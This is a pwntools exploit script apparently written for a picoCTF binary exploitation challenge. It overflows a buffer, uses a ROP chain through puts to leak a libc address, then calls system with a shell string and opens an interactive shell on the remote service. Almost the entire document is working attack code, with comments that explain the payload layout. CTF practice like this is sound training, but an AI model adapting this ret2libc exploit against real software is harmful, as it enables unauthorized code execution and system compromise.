from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r,'''
            break *(main)
                        ''')
    else:
        r = remote("mercury.picoctf.net", 49464)

    return r


def main():
    r = conn()
    p = r

    pop_rdi = 0x0000000000400913
    puts_got = 0x601018
    puts_plt = 0x400540
    back_to_main = 0x00400771

    """
    payload structure:
    1. pop rdi; ret; this will allow us to write to rdi by placing something on the stack, jumpring to this gadget and returning
    2. when the ret call is done we need to have a valid address to go to. so we write to the stack again so taht we can have rsp
    point to the puts@plt which is like making a func call to puts()
    3. when puts finishes calling it also needs to ret so we werei another address to the stack
    """

    print(p.recvline())
    p.sendline(cyclic(136)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(back_to_main))
    ret = p.recvuntil("R!")

    puts_addr = u64(ret[122:128].ljust(8,b"\x00"))
    puts_offset = 0x80a30
    libc_addr = puts_addr - puts_offset
    print(hex(libc_addr))

    system_offset = 0x4f4e0
    system_addr = libc_addr + system_offset
    print(hex(system_addr))

    bin_bash_offset = 0x1b40fa
    bin_bash_addr = libc_addr + bin_bash_offset
    print(hex(bin_bash_addr))
    input("continue?")
    print("sending exploit")
    p.sendline(cyclic(136)+p64(pop_rdi)+p64(bin_bash_addr)+p64(0x40052e)+p64(system_addr)+p64(back_to_main))

    r.interactive()


if __name__ == "__main__":
    main()
